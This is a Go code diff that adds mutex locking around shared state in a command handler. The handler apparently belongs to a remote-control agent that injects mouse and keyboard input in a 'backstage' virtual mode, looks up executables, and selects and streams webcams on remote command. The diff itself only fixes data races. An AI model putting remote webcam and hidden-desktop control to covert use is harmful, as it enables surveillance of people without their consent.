@@ -1376,7 +1376,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if isVirtualModeActive(env) {
-			if !env.VirtualMouseControl {
+			env.VirtualMu.Lock()
+			vmc := env.VirtualMouseControl
+			env.VirtualMu.Unlock()
+			if !vmc {
 				sendCommandResultSafe(env, cmdID, true, "")
 				return nil
 			}
@@ -1480,7 +1483,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if isVirtualModeActive(env) {
-			if !env.VirtualMouseControl {
+			env.VirtualMu.Lock()
+			vmc := env.VirtualMouseControl
+			env.VirtualMu.Unlock()
+			if !vmc {
 				sendCommandResultSafe(env, cmdID, true, "")
 				return nil
 			}
@@ -1580,7 +1586,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if isVirtualModeActive(env) {
-			if !env.VirtualMouseControl {
+			env.VirtualMu.Lock()
+			vmc := env.VirtualMouseControl
+			env.VirtualMu.Unlock()
+			if !vmc {
 				sendCommandResultSafe(env, cmdID, true, "")
 				return nil
 			}
@@ -1680,7 +1689,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if isVirtualModeActive(env) {
-			if !env.VirtualMouseControl {
+			env.VirtualMu.Lock()
+			vmc := env.VirtualMouseControl
+			env.VirtualMu.Unlock()
+			if !vmc {
 				sendCommandResultSafe(env, cmdID, true, "")
 				return nil
 			}
@@ -1705,7 +1717,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		if vk := keyCodeToVKbackstage(code); vk != 0 {
 			if isVirtualModeActive(env) {
-				if !env.VirtualKeyboardControl {
+				env.VirtualMu.Lock()
+				vkc := env.VirtualKeyboardControl
+				env.VirtualMu.Unlock()
+				if !vkc {
 					sendCommandResultSafe(env, cmdID, true, "")
 					return nil
 				}
@@ -1730,7 +1745,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		if vk := keyCodeToVKbackstage(code); vk != 0 {
 			if isVirtualModeActive(env) {
-				if !env.VirtualKeyboardControl {
+				env.VirtualMu.Lock()
+				vkc := env.VirtualKeyboardControl
+				env.VirtualMu.Unlock()
+				if !vkc {
 					sendCommandResultSafe(env, cmdID, true, "")
 					return nil
 				}
@@ -1929,7 +1947,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		log.Printf("backstage: lookup exe %q", exeName)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("backstage_lookup", nil, func() {
-			filesearch.LookupExe(exeName, 8, func(path string) {
+			filesearch.LookupExe(context.Background(), exeName, 8, func(path string) {
 				_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageLookupResult{
 					Type: "backstage_lookup_result",
 					Exe:  exeName,
@@ -2385,7 +2403,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		for _, dev := range devices {
 			out = append(out, wire.WebcamDevice{Index: dev.Index, Name: dev.Name, MaxFPS: dev.MaxFPS})
 		}
-		_ = wire.WriteMsg(ctx, env.Conn, wire.WebcamDevices{Type: "webcam_devices", Devices: out, Selected: env.WebcamDeviceIndex})
+		env.WebcamMu.Lock()
+		selectedIdx := env.WebcamDeviceIndex
+		env.WebcamMu.Unlock()
+		_ = wire.WriteMsg(ctx, env.Conn, wire.WebcamDevices{Type: "webcam_devices", Devices: out, Selected: selectedIdx})
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "webcam_select":
@@ -2396,7 +2417,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				index = n
 			}
 		}
+		env.WebcamMu.Lock()
 		env.WebcamDeviceIndex = index
+		env.WebcamMu.Unlock()
 		capture.CleanupWebcam()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
@@ -2409,8 +2432,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "stop webcam before changing fps")
 			return nil
 		}
+		env.WebcamMu.Lock()
 		fps := env.WebcamFPS
 		useMax := env.WebcamUseMaxFPS
+		env.WebcamMu.Unlock()
 		if payload != nil {
 			if n, ok := payloadInt(payload, "fps"); ok {
 				fps = n
